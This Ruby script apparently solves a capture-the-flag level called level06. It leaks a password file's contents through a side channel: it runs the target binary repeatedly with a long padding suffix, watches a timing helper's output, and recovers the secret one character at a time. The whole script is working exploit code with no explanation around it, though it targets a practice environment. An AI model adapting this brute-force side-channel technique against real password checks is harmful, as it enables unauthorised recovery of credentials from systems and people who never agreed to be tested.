cmd = './level06 password'
cmd = '/levels/level06 /home/the-flag/.password'
redirect =  '2>&1 | ./time_print'
TEST_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars.to_a
suffix = '-'*(2**17-300)
sleep 1

#"./level06 password thh#{suffix} 2>&1 | ./time_print 2"

puts "Suffix: #{suffix.length}"
answer = ''
64.times do |i|
  matches = Hash.new(0)
  5.times do |j|
    TEST_CHARS.each do |char|
      guess = answer + char
      #full_cmd = "#{cmd} #{guess}#{suffix} #{redirect} #{0}"
      #puts "Cmd: #{full_cmd}"
      out = ''
#120 :: . :: 53
      while(out == '' || out.split("\n").last.split(' :: ').last.to_i < 40)
        out = `#{cmd} #{guess}#{suffix} #{redirect} #{i}`
      end
      #puts "Out: #{out}"
      #sleep 1
      matches[char] += 1 if out.include?('Match')
    end
  end

  puts matches.inspect
  answer << matches.max_by {|key,val| val}.first if matches.count > 0
  puts "Answer: #{answer}"
end

